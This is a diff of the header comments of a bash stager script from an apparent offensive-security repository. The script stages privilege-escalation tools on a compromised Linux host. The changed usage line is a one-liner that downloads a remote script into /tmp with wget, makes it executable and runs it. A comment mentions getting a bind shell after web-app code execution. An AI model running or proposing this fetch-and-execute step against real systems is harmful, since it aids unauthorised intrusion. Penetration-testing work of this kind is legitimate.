@@ -1,6 +1,6 @@
 #!/bin/bash
 # used to stage all appropriate tools needed for privesc + handles some base config setup
-# use: cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/git_linux_stager.sh && chmod +x git_linux_stager.sh && ./git_linux_stager.sh 
+# use: cd /tmp/ && wget https://raw.githubusercontent.com/WillChaos/OFFSEC/master/PrivEsc/LinuxStager.sh && chmod +x LinuxStager.sh && ./LinuxStager.sh
 # (note: ive run this from a tedious code execution on a web application and got a bind shell, with all prereqs staged. it can save lifes)
 
 
